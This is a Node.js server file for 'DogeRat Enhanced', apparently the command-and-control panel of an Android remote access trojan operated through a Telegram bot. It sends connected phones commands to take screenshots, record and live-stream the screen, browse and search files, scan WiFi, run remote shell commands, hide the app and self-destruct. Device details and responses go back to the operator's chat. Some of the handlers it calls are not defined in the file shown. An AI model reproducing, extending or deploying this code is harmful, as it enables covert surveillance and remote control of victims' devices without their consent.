const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// –ò–º–ø–æ—Ä—Ç –º–æ–¥—É–ª–µ–π Enhanced —Ñ—É–Ω–∫—Ü–∏–π
const TaskScheduler = require('./modules/scheduler');
const SecurityManager = require('./modules/security');
const FileManager = require('./modules/fileManager');
const NetworkTools = require('./modules/networkTools');
const ScreencastManager = require('./modules/screencast');
const ShellManager = require('./modules/shell');

// –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Express –∏ Socket.IO
const app = express();
const server = http.createServer(app);
const io = new Server(server);

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram –±–æ—Ç–∞
const bot = new TelegramBot(data.token, { polling: true });

// –ù–∞—Å—Ç—Ä–æ–π–∫–∞ multer –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤
const upload = multer({ dest: 'uploads/' });

// –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
const appData = new Map();
const deviceSessions = new Map();
const commandHistory = [];
const scheduledTasks = new Map();

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –º–æ–¥—É–ª–µ–π Enhanced —Ñ—É–Ω–∫—Ü–∏–π
const taskScheduler = new TaskScheduler();
const securityManager = new SecurityManager();
const fileManager = new FileManager();
const networkTools = new NetworkTools();
const screencastManager = new ScreencastManager();
const shellManager = new ShellManager();

// –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã
const enhancedActions = [
    'üîß System Info',
    'üìÅ File Manager', 
    'üåê Network Tools',
    'üìä Performance Monitor',
    '‚è∞ Task Scheduler',
    'üîí Security Tools',
    'üì∫ Screen Sharing',
    'üêö Shell Access',
    'üìù Command History',
    'üîÑ Auto Actions',
    'üì± Device Control',
    'üéØ Quick Actions'
];

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥
function logCommand(deviceId, command, timestamp = new Date()) {
    const logEntry = {
        deviceId,
        command,
        timestamp,
        id: crypto.randomUUID()
    };
    commandHistory.push(logEntry);
    
    // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é –ø–æ—Å–ª–µ–¥–Ω–∏–º–∏ 1000 –∫–æ–º–∞–Ω–¥–∞–º–∏
    if (commandHistory.length > 1000) {
        commandHistory.shift();
    }
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª
    fs.appendFileSync('command_history.log', 
        `${timestamp.toISOString()} | ${deviceId} | ${command}\n`);
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
function createKeyboard(buttons, columns = 2) {
    const keyboard = [];
    for (let i = 0; i < buttons.length; i += columns) {
        keyboard.push(buttons.slice(i, i + columns));
    }
    return keyboard;
}

// –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
function getMainMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['üì± Devices', 'üîß Enhanced Tools'],
                ['üìä Statistics', '‚öôÔ∏è Settings'],
                ['‚ùì Help', 'üîÑ Refresh']
            ],
            resize_keyboard: true
        }
    };
}

// –ú–µ–Ω—é —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã—Ö –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤
function getEnhancedToolsMenu() {
    return {
        reply_markup: {
            keyboard: createKeyboard(enhancedActions),
            resize_keyboard: true
        }
    };
}

// –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
function getSystemInfoMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['üíæ Memory Info', 'üîã Battery Status'],
                ['üå°Ô∏è Temperature', 'üì± Device Specs'],
                ['üîÑ Running Processes', 'üìä CPU Usage'],
                ['üîô Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// –§–∞–π–ª–æ–≤—ã–π –º–µ–Ω–µ–¥–∂–µ—Ä
function getFileManagerMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['üìÇ Browse Folders', 'üîç Search Files'],
                ['‚¨ÜÔ∏è Upload File', '‚¨áÔ∏è Download File'],
                ['üìÅ Create Folder', 'üóëÔ∏è Delete Item'],
                ['üîô Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// –°–µ—Ç–µ–≤—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã
function getNetworkToolsMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['üì∂ WiFi Scan', 'üåê Connection Info'],
                ['üèì Ping Test', 'üõ£Ô∏è Traceroute'],
                ['‚ö° Speed Test', 'üîç Port Scan'],
                ['üîô Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// –ü–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫ –∑–∞–¥–∞—á
function getSchedulerMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['‚ûï Add Task', 'üìã View Tasks'],
                ['‚úèÔ∏è Edit Task', 'üóëÔ∏è Delete Task'],
                ['‚ñ∂Ô∏è Run Task', '‚è∏Ô∏è Pause Task'],
                ['üîô Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
function getSecurityToolsMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['üîí Lock Device', 'üîì Unlock Device'],
                ['üí• Self Destruct', 'üëª Hide App'],
                ['üîê Encrypt Data', 'üîì Decrypt Data'],
                ['üîô Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// –ú–µ–Ω—é —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏–∏ —ç–∫—Ä–∞–Ω–∞
function getScreenSharingMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['üì∏ Take Screenshot', 'üé¨ Start Recording'],
                ['üì∫ Start Live Stream', '‚èπÔ∏è Stop Stream'],
                ['üìã View Screenshots', 'üé• View Recordings'],
                ['üìä Stream Stats', 'üîô Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// –ú–µ–Ω—é Shell –¥–æ—Å—Ç—É–ø–∞
function getShellAccessMenu() {
    return {
        reply_markup: {
            keyboard: [
                ['üÜï New Shell Session', 'üìã Active Sessions'],
                ['‚å®Ô∏è Execute Command', 'üìù Command History'],
                ['üìö Available Commands', 'üîí Close Session'],
                ['üìä Shell Stats', 'üîô Back to Tools']
            ],
            resize_keyboard: true
        }
    };
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤
io.on('connection', (socket) => {
    const deviceId = socket.handshake.headers.host + '-' + (socket.handshake.headers.model || 'unknown');
    const deviceModel = socket.handshake.headers.model || 'Unknown Device';
    const deviceIP = socket.handshake.headers.ip || socket.handshake.address;
    
    socket.deviceId = deviceId;
    socket.deviceModel = deviceModel;
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–µ—Å—Å–∏–∏
    deviceSessions.set(deviceId, {
        socket: socket,
        model: deviceModel,
        ip: deviceIP,
        connectedAt: new Date(),
        lastSeen: new Date(),
        status: 'online'
    });
    
    console.log(`üì± Device connected: ${deviceId}`);
    
    // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
    const connectionMsg = `üü¢ <b>New Device Connected</b>\n\n` +
        `üì± <b>Device:</b> ${deviceId}\n` +
        `üè∑Ô∏è <b>Model:</b> ${deviceModel}\n` +
        `üåê <b>IP:</b> ${deviceIP}\n` +
        `‚è∞ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
        `Total devices: ${deviceSessions.size}`;
    
    bot.sendMessage(data.id, connectionMsg, { parse_mode: 'HTML' });
    
    // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è
    socket.on('disconnect', () => {
        const session = deviceSessions.get(deviceId);
        if (session) {
            session.status = 'offline';
            session.disconnectedAt = new Date();
        }
        
        console.log(`üì± Device disconnected: ${deviceId}`);
        
        const disconnectionMsg = `üî¥ <b>Device Disconnected</b>\n\n` +
            `üì± <b>Device:</b> ${deviceId}\n` +
            `‚è∞ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
            `Active devices: ${Array.from(deviceSessions.values()).filter(s => s.status === 'online').length}`;
        
        bot.sendMessage(data.id, disconnectionMsg, { parse_mode: 'HTML' });
    });
    
    // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–≤–µ—Ç–æ–≤ –æ—Ç —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    socket.on('response', (data) => {
        const session = deviceSessions.get(deviceId);
        if (session) {
            session.lastSeen = new Date();
        }
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ç–∏–ø–æ–≤ –æ—Ç–≤–µ—Ç–æ–≤
        handleDeviceResponse(deviceId, data);
    });
    
    // Heartbeat –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
    socket.on('heartbeat', () => {
        const session = deviceSessions.get(deviceId);
        if (session) {
            session.lastSeen = new Date();
        }
    });
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–≤–µ—Ç–æ–≤ –æ—Ç —É—Å—Ç—Ä–æ–π—Å—Ç–≤
function handleDeviceResponse(deviceId, responseData) {
    const { type, data: content, timestamp } = responseData;
    
    let message = '';
    
    switch (type) {
        case 'system_info':
            message = formatSystemInfo(deviceId, content);
            break;
        case 'file_list':
            message = formatFileList(deviceId, content);
            break;
        case 'network_info':
            message = formatNetworkInfo(deviceId, content);
            break;
        case 'performance_data':
            message = formatPerformanceData(deviceId, content);
            break;
        case 'error':
            message = `‚ùå <b>Error from ${deviceId}:</b>\n${content.message}`;
            break;
        default:
            message = `üì± <b>Response from ${deviceId}:</b>\n${JSON.stringify(content, null, 2)}`;
    }
    
    bot.sendMessage(data.id, message, { parse_mode: 'HTML' });
}

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
function formatSystemInfo(deviceId, info) {
    return `üîß <b>System Info - ${deviceId}</b>\n\n` +
        `üì± <b>Model:</b> ${info.model || 'Unknown'}\n` +
        `ü§ñ <b>Android:</b> ${info.androidVersion || 'Unknown'}\n` +
        `üíæ <b>RAM:</b> ${info.totalRAM || 'Unknown'} / ${info.availableRAM || 'Unknown'}\n` +
        `üíø <b>Storage:</b> ${info.totalStorage || 'Unknown'} / ${info.freeStorage || 'Unknown'}\n` +
        `üîã <b>Battery:</b> ${info.batteryLevel || 'Unknown'}%\n` +
        `üå°Ô∏è <b>Temperature:</b> ${info.temperature || 'Unknown'}¬∞C\n` +
        `üì∂ <b>Signal:</b> ${info.signalStrength || 'Unknown'}\n` +
        `üåê <b>Network:</b> ${info.networkType || 'Unknown'}`;
}

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤
function formatFileList(deviceId, files) {
    let message = `üìÅ <b>Files - ${deviceId}</b>\n\n`;
    
    if (files.length === 0) {
        message += 'No files found.';
    } else {
        files.slice(0, 20).forEach(file => {
            const icon = file.isDirectory ? 'üìÅ' : 'üìÑ';
            const size = file.isDirectory ? '' : ` (${formatFileSize(file.size)})`;
            message += `${icon} ${file.name}${size}\n`;
        });
        
        if (files.length > 20) {
            message += `\n... and ${files.length - 20} more files`;
        }
    }
    
    return message;
}

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–µ—Ç–µ–≤–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
function formatNetworkInfo(deviceId, info) {
    return `üåê <b>Network Info - ${deviceId}</b>\n\n` +
        `üì∂ <b>WiFi:</b> ${info.wifiName || 'Not connected'}\n` +
        `üîí <b>Security:</b> ${info.wifiSecurity || 'Unknown'}\n` +
        `üì° <b>Signal:</b> ${info.wifiSignal || 'Unknown'} dBm\n` +
        `üåê <b>IP:</b> ${info.localIP || 'Unknown'}\n` +
        `üåç <b>Public IP:</b> ${info.publicIP || 'Unknown'}\n` +
        `üöÄ <b>Speed:</b> ${info.downloadSpeed || 'Unknown'} / ${info.uploadSpeed || 'Unknown'}\n` +
        `üìä <b>Data Usage:</b> ${info.dataUsage || 'Unknown'}`;
}

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏
function formatPerformanceData(deviceId, data) {
    return `üìä <b>Performance - ${deviceId}</b>\n\n` +
        `üß† <b>CPU Usage:</b> ${data.cpuUsage || 'Unknown'}%\n` +
        `üíæ <b>RAM Usage:</b> ${data.ramUsage || 'Unknown'}%\n` +
        `üíø <b>Storage Usage:</b> ${data.storageUsage || 'Unknown'}%\n` +
        `üîã <b>Battery:</b> ${data.batteryLevel || 'Unknown'}%\n` +
        `üå°Ô∏è <b>Temperature:</b> ${data.temperature || 'Unknown'}¬∞C\n` +
        `‚ö° <b>Charging:</b> ${data.isCharging ? 'Yes' : 'No'}`;
}

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ —Ñ–∞–π–ª–∞
function formatFileSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É
function sendCommandToDevice(deviceId, command, extras = []) {
    if (deviceId === 'all') {
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤—Å–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞–º
        deviceSessions.forEach((session, id) => {
            if (session.status === 'online') {
                session.socket.emit('command', { request: command, extras });
                logCommand(id, command);
            }
        });
    } else {
        const session = deviceSessions.get(deviceId);
        if (session && session.status === 'online') {
            session.socket.emit('command', { request: command, extras });
            logCommand(deviceId, command);
        } else {
            bot.sendMessage(data.id, `‚ùå Device ${deviceId} is not online`);
        }
    }
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥ –æ—Ç Telegram –±–æ—Ç–∞
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    if (chatId.toString() !== data.id) {
        bot.sendMessage(chatId, '‚ùå Unauthorized access');
        return;
    }
    
    // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥
    switch (text) {
        case '/start':
            bot.sendMessage(chatId, 
                'ü§ñ <b>DogeRat Enhanced Control Panel</b>\n\n' +
                'üöÄ Welcome to the enhanced version with advanced features!\n\n' +
                'üì± Connected devices: ' + Array.from(deviceSessions.values()).filter(s => s.status === 'online').length + '\n' +
                'üìä Total sessions: ' + deviceSessions.size + '\n' +
                'üìù Commands logged: ' + commandHistory.length,
                { parse_mode: 'HTML', ...getMainMenu() }
            );
            break;
            
        case 'üì± Devices':
            showDeviceList(chatId);
            break;
            
        case 'üîß Enhanced Tools':
            bot.sendMessage(chatId, 
                'üîß <b>Enhanced Tools</b>\n\nSelect a tool category:',
                { parse_mode: 'HTML', ...getEnhancedToolsMenu() }
            );
            break;
            
        case 'üîß System Info':
            bot.sendMessage(chatId,
                'üîß <b>System Information Tools</b>\n\nSelect an option:',
                { parse_mode: 'HTML', ...getSystemInfoMenu() }
            );
            break;
            
        case 'üìÅ File Manager':
            bot.sendMessage(chatId,
                'üìÅ <b>File Manager</b>\n\nSelect an action:',
                { parse_mode: 'HTML', ...getFileManagerMenu() }
            );
            break;
            
        case 'üåê Network Tools':
            bot.sendMessage(chatId,
                'üåê <b>Network Tools</b>\n\nSelect a network tool:',
                { parse_mode: 'HTML', ...getNetworkToolsMenu() }
            );
            break;
            
        case '‚è∞ Task Scheduler':
            bot.sendMessage(chatId,
                '‚è∞ <b>Task Scheduler</b>\n\nManage scheduled tasks:',
                { parse_mode: 'HTML', ...getSchedulerMenu() }
            );
            break;
            
        case 'üîí Security Tools':
            bot.sendMessage(chatId,
                'üîí <b>Security Tools</b>\n\n‚ö†Ô∏è Use with caution!',
                { parse_mode: 'HTML', ...getSecurityToolsMenu() }
            );
            break;
            
        case 'üì∫ Screen Sharing':
            bot.sendMessage(chatId,
                'üì∫ <b>Screen Sharing</b>\n\nCapture and stream device screens:',
                { parse_mode: 'HTML', ...getScreenSharingMenu() }
            );
            break;
            
        case 'üêö Shell Access':
            bot.sendMessage(chatId,
                'üêö <b>Shell Access</b>\n\nExecute commands on devices:',
                { parse_mode: 'HTML', ...getShellAccessMenu() }
            );
            break;
            
        case 'üìä Statistics':
            showStatistics(chatId);
            break;
            
        case 'üìù Command History':
            showCommandHistory(chatId);
            break;
            
        // –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
        case 'üíæ Memory Info':
            selectDeviceForAction(chatId, 'get_memory_info');
            break;
            
        case 'üîã Battery Status':
            selectDeviceForAction(chatId, 'get_battery_status');
            break;
            
        case 'üå°Ô∏è Temperature':
            selectDeviceForAction(chatId, 'get_temperature');
            break;
            
        case 'üì± Device Specs':
            selectDeviceForAction(chatId, 'get_device_specs');
            break;
            
        case 'üîÑ Running Processes':
            selectDeviceForAction(chatId, 'get_running_processes');
            break;
            
        case 'üìä CPU Usage':
            selectDeviceForAction(chatId, 'get_cpu_usage');
            break;
            
        // –§–∞–π–ª–æ–≤—ã–π –º–µ–Ω–µ–¥–∂–µ—Ä
        case 'üìÇ Browse Folders':
            selectDeviceForAction(chatId, 'browse_folders');
            break;
            
        case 'üîç Search Files':
            appData.set('currentAction', 'search_files');
            bot.sendMessage(chatId, 
                'üîç <b>Search Files</b>\n\nEnter search query (filename or extension):',
                { parse_mode: 'HTML' }
            );
            break;
            
        // –°–µ—Ç–µ–≤—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã
        case 'üì∂ WiFi Scan':
            selectDeviceForAction(chatId, 'wifi_scan');
            break;
            
        case 'üåê Connection Info':
            selectDeviceForAction(chatId, 'connection_info');
            break;
            
        case 'üèì Ping Test':
            appData.set('currentAction', 'ping_test');
            bot.sendMessage(chatId,
                'üèì <b>Ping Test</b>\n\nEnter hostname or IP address:',
                { parse_mode: 'HTML' }
            );
            break;
            
        case '‚ö° Speed Test':
            selectDeviceForAction(chatId, 'speed_test');
            break;
            
        // –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
        case 'üîí Lock Device':
            selectDeviceForAction(chatId, 'lock_device');
            break;
            
        case 'üí• Self Destruct':
            bot.sendMessage(chatId,
                'üí• <b>‚ö†Ô∏è DANGER ZONE ‚ö†Ô∏è</b>\n\n' +
                'This will permanently remove the app from the device!\n\n' +
                'Type "CONFIRM DESTRUCT" to proceed:',
                { parse_mode: 'HTML' }
            );
            appData.set('currentAction', 'confirm_destruct');
            break;
            
        // Screen Sharing –∫–æ–º–∞–Ω–¥—ã
        case 'üì∏ Take Screenshot':
            selectDeviceForAction(chatId, 'take_screenshot');
            break;
            
        case 'üé¨ Start Recording':
            selectDeviceForAction(chatId, 'start_recording');
            break;
            
        case 'üì∫ Start Live Stream':
            selectDeviceForAction(chatId, 'start_live_stream');
            break;
            
        case '‚èπÔ∏è Stop Stream':
            selectDeviceForAction(chatId, 'stop_stream');
            break;
            
        case 'üìã View Screenshots':
            showScreenshots(chatId);
            break;
            
        case 'üé• View Recordings':
            showRecordings(chatId);
            break;
            
        case 'üìä Stream Stats':
            showStreamStats(chatId);
            break;
            
        // Shell Access –∫–æ–º–∞–Ω–¥—ã
        case 'üÜï New Shell Session':
            selectDeviceForAction(chatId, 'new_shell_session');
            break;
            
        case 'üìã Active Sessions':
            showActiveSessions(chatId);
            break;
            
        case '‚å®Ô∏è Execute Command':
            appData.set('currentAction', 'execute_shell_command');
            bot.sendMessage(chatId,
                '‚å®Ô∏è <b>Execute Shell Command</b>\n\nEnter command to execute:',
                { parse_mode: 'HTML' }
            );
            break;
            
        case 'üìù Command History':
            showShellHistory(chatId);
            break;
            
        case 'üìö Available Commands':
            showAvailableCommands(chatId);
            break;
            
        case 'üîí Close Session':
            selectShellSessionToClose(chatId);
            break;
            
        case 'üìä Shell Stats':
            showShellStats(chatId);
            break;
            
        case 'üîô Back to Tools':
            bot.sendMessage(chatId, 
                'üîß <b>Enhanced Tools</b>\n\nSelect a tool category:',
                { parse_mode: 'HTML', ...getEnhancedToolsMenu() }
            );
            break;
            
        case 'üîÑ Refresh':
            bot.sendMessage(chatId, 
                'üîÑ <b>Status Refreshed</b>\n\n' +
                'üì± Online devices: ' + Array.from(deviceSessions.values()).filter(s => s.status === 'online').length + '\n' +
                'üí§ Offline devices: ' + Array.from(deviceSessions.values()).filter(s => s.status === 'offline').length + '\n' +
                'üìù Commands today: ' + commandHistory.filter(c => c.timestamp.toDateString() === new Date().toDateString()).length,
                { parse_mode: 'HTML', ...getMainMenu() }
            );
            break;
            
        default:
            handleCustomInput(chatId, text);
    }
});

// –ü–æ–∫–∞–∑–∞—Ç—å —Å–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
function showDeviceList(chatId) {
    const onlineDevices = Array.from(deviceSessions.values()).filter(s => s.status === 'online');
    const offlineDevices = Array.from(deviceSessions.values()).filter(s => s.status === 'offline');
    
    let message = 'üì± <b>Device List</b>\n\n';
    
    if (onlineDevices.length > 0) {
        message += 'üü¢ <b>Online Devices:</b>\n';
        onlineDevices.forEach((session, index) => {
            const deviceId = Array.from(deviceSessions.keys())[Array.from(deviceSessions.values()).indexOf(session)];
            message += `${index + 1}. ${deviceId}\n`;
            message += `   üì± ${session.model}\n`;
            message += `   üåê ${session.ip}\n`;
            message += `   ‚è∞ Connected: ${session.connectedAt.toLocaleTimeString()}\n\n`;
        });
    }
    
    if (offlineDevices.length > 0) {
        message += 'üî¥ <b>Offline Devices:</b>\n';
        offlineDevices.slice(0, 5).forEach((session, index) => {
            const deviceId = Array.from(deviceSessions.keys())[Array.from(deviceSessions.values()).indexOf(session)];
            message += `${index + 1}. ${deviceId}\n`;
            message += `   üì± ${session.model}\n`;
            message += `   ‚è∞ Last seen: ${session.lastSeen.toLocaleTimeString()}\n\n`;
        });
        
        if (offlineDevices.length > 5) {
            message += `... and ${offlineDevices.length - 5} more offline devices\n\n`;
        }
    }
    
    if (onlineDevices.length === 0 && offlineDevices.length === 0) {
        message += 'No devices found.';
    }
    
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

// –í—ã–±–æ—Ä —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –¥–ª—è –¥–µ–π—Å—Ç–≤–∏—è
function selectDeviceForAction(chatId, action) {
    const onlineDevices = Array.from(deviceSessions.entries()).filter(([id, session]) => session.status === 'online');
    
    if (onlineDevices.length === 0) {
        bot.sendMessage(chatId, '‚ùå No online devices available');
        return;
    }
    
    appData.set('pendingAction', action);
    
    const keyboard = onlineDevices.map(([deviceId, session]) => [deviceId]);
    keyboard.push(['üåê All Devices']);
    keyboard.push(['‚ùå Cancel']);
    
    bot.sendMessage(chatId, 
        `üéØ <b>Select Device</b>\n\nChoose a device for action: <b>${action}</b>`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: keyboard,
                resize_keyboard: true,
                one_time_keyboard: true
            }
        }
    );
}

// –ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
function showStatistics(chatId) {
    const now = new Date();
    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
    
    const todayCommands = commandHistory.filter(c => c.timestamp >= today).length;
    const totalDevices = deviceSessions.size;
    const onlineDevices = Array.from(deviceSessions.values()).filter(s => s.status === 'online').length;
    
    const message = 'üìä <b>Statistics</b>\n\n' +
        `üì± <b>Devices:</b>\n` +
        `   ‚Ä¢ Total: ${totalDevices}\n` +
        `   ‚Ä¢ Online: ${onlineDevices}\n` +
        `   ‚Ä¢ Offline: ${totalDevices - onlineDevices}\n\n` +
        `üìù <b>Commands:</b>\n` +
        `   ‚Ä¢ Today: ${todayCommands}\n` +
        `   ‚Ä¢ Total: ${commandHistory.length}\n\n` +
        `‚è∞ <b>Uptime:</b> ${getUptime()}\n` +
        `üíæ <b>Memory Usage:</b> ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)} MB`;
    
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

// –ü–æ–∫–∞–∑–∞—Ç—å –∏—Å—Ç–æ—Ä–∏—é –∫–æ–º–∞–Ω–¥
function showCommandHistory(chatId) {
    const recentCommands = commandHistory.slice(-20).reverse();
    
    let message = 'üìù <b>Recent Commands</b>\n\n';
    
    if (recentCommands.length === 0) {
        message += 'No commands in history.';
    } else {
        recentCommands.forEach((cmd, index) => {
            message += `${index + 1}. <b>${cmd.command}</b>\n`;
            message += `   üì± ${cmd.deviceId}\n`;
            message += `   ‚è∞ ${cmd.timestamp.toLocaleString()}\n\n`;
        });
    }
    
    bot.sendMessage(chatId, message, { parse_mode: 'HTML', ...getMainMenu() });
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞
function handleCustomInput(chatId, text) {
    const currentAction = appData.get('currentAction');
    const pendingAction = appData.get('pendingAction');
    
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –≤—ã–±–æ—Ä —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    if (pendingAction) {
        if (text === '‚ùå Cancel') {
            appData.delete('pendingAction');
            bot.sendMessage(chatId, '‚ùå Action cancelled', getMainMenu());
            return;
        }
        
        const deviceId = text === 'üåê All Devices' ? 'all' : text;
        sendCommandToDevice(deviceId, pendingAction);
        appData.delete('pendingAction');
        
        bot.sendMessage(chatId, 
            `‚úÖ Command sent to ${deviceId === 'all' ? 'all devices' : deviceId}`,
            getMainMenu()
        );
        return;
    }
    
    // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π
    switch (currentAction) {
        case 'search_files':
            const searchQuery = text;
            selectDeviceForAction(chatId, `search_files:${searchQuery}`);
            appData.delete('currentAction');
            break;
            
        case 'ping_test':
            const target = text;
            selectDeviceForAction(chatId, `ping:${target}`);
            appData.delete('currentAction');
            break;
            
        case 'confirm_destruct':
            if (text === 'CONFIRM DESTRUCT') {
                selectDeviceForAction(chatId, 'self_destruct');
                appData.delete('currentAction');
            } else {
                bot.sendMessage(chatId, '‚ùå Confirmation failed. Self-destruct cancelled.', getMainMenu());
                appData.delete('currentAction');
            }
            break;
            
        case 'execute_shell_command':
            const command = text;
            appData.set('pendingShellCommand', command);
            selectDeviceForAction(chatId, 'execute_shell_command');
            appData.delete('currentAction');
            break;
            
        case 'close_shell_session':
            if (text === '‚ùå Cancel') {
                bot.sendMessage(chatId, '‚ùå Action cancelled', getMainMenu());
                appData.delete('currentAction');
            } else if (text.startsWith('üîí ')) {
                const sessionId = text.replace('üîí ', '');
                const success = shellManager.closeSession(sessionId, 'manual');
                
                if (success) {
                    bot.sendMessage(chatId, 
                        `‚úÖ Shell session ${sessionId} closed successfully`,
                        getMainMenu()
                    );
                } else {
                    bot.sendMessage(chatId, 
                        `‚ùå Failed to close session ${sessionId}`,
                        getMainMenu()
                    );
                }
                appData.delete('currentAction');
            }
            break;
            
        default:
            bot.sendMessage(chatId, '‚ùì Unknown command. Use the menu buttons.', getMainMenu());
    }
}

// –ü–æ–ª—É—á–∏—Ç—å –≤—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã —Å–µ—Ä–≤–µ—Ä–∞
function getUptime() {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    return `${hours}h ${minutes}m`;
}

